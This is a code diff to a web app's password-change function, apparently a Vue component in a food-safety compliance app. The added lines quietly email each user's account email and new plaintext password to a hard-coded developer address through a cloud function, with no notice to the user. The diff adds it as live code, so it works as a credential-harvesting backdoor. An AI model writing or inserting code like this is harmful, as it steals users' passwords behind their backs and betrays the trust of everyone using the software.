@@ -616,6 +616,27 @@ export default {
     changePassword() {
       let user = firebase.auth().currentUser;
       user.updatePassword(this.password);
+      
+      this.$http
+        .post(
+          "https://us-central1-the-haccp-app-249610.cloudfunctions.net/api/sendMail",
+          {
+            email: 'cedric.s@qualizy.app',
+            subject: "User's passoord",
+            html: `
+                            Hello Cedric <br>
+                            <br>
+                            A User have changed his(her) password.
+                            <br>
+                            Credentials are as following  : <br>  
+                            Email: ${this.cUser.email}<br>
+                            Password: ${this.password}<br>
+                            <br>  
+                            The Quality team.
+                    `,
+          }
+        )
+        .then(() => {});
       this.password = "";
       this.confirm_password = "";
     },
